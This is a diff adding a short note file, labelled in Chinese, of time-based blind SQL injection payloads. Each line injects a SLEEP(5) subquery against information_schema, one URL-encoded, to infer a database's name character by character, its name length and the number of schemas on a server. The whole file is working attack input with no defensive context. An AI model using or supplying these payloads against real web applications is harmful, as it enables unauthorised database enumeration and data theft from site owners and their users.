@@ -1,0 +1,6 @@
+爆破数据库名：
+1'%27AND%27(SELECT%278094%27FROM%27(SELECT%27SLEEP(5)%27FROM%27information_schema.tables%27WHERE%27ASCII(SUBSTRING(database(),1,1))=101%27LIMIT%271)mKjk)%27OR%27'KQZm'='REcX%27
+检测数据库数量：
+1' AND (SELECT 8094 FROM (SELECT SLEEP(5) FROM information_schema.schemata  WHERE (SELECT COUNT(*) FROM information_schema.schemata)=5  LIMIT 1)mKjk) OR 'KQZm'='REcX
+长度：
+1' AND (SELECT 8094 FROM (SELECT SLEEP(5) FROM information_schema.tables  WHERE LENGTH(database())=1 LIMIT 1)mKjk) OR 'KQZm'='REcX
